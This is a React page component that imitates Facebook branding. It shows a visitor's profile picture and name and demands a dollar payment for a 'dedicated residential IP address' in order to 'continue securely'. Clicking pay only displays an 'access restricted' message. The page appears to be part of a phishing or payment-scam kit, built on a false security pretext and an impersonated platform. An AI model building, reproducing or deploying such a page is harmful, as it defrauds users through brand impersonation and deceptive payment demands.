'use client';

import multipleStep from '@/lib/multipleStep';
import { useEffect, useState } from 'react';

export default function ResidentialIpPayment() {
  const [paid, setPaid] = useState(false);

  const [infos, setInfos] = useState<any>(null);
 
   useEffect(() => {
     async function fetchInfos() {
       const data = await multipleStep();
       setInfos(data);
     }
     fetchInfos();
   }, []);

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
      <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
        {/* User Header */}
        <div className="flex items-center gap-4 mb-6">
          <img
            src={infos?.profile_pic}
            className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
          />
          <div>
            <p className="text-sm text-gray-500">Facebook User</p>
            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
          </div>
        </div>

        {/* Illustration */}
        <div className="w-full flex justify-center mb-6">
          <svg
            width="120"
            height="120"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <rect width="24" height="24" rx="12" fill="#fef9c3" />
            <path
              d="M3 11L12 4l9 7v8a2 2 0 01-2 2h-3a1 1 0 01-1-1v-4H9v4a1 1 0 01-1 1H5a2 2 0 01-2-2v-8z"
              fill="#facc15"
              stroke="#eab308"
              strokeWidth="1.5"
            />
            <path
              d="M12 15v-3"
              stroke="#92400e"
              strokeWidth="2"
              strokeLinecap="round"
            />
          </svg>
        </div>

        {/* Title & Instructions */}
        <h1 className="text-xl font-semibold text-[#111827] mb-2 text-center">
          Residential IP Required
        </h1>
        <p className="text-sm text-gray-600 mb-5 text-center">
          To continue securely, a <strong>${infos?.payment} payment</strong> is required to assign a dedicated residential IP address to your current session.
        </p>

        {/* Payment Notice */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-md mb-6">
          <p className="text-sm font-medium">
            This ensures verified location access and improves session stability.
          </p>
        </div>

        {/* Action Button */}
        <button
          onClick={() => setPaid(true)}
          className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
        >
          Pay ${infos?.payment} for Residential IP
        </button>

        {/* Confirmation */}
        {paid && (
        <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
                        <p className="text-sm font-medium">
                            Access restricted to registered users only..
                        </p>

                    </div>
        )}
      </div>
    </div>
  );
}
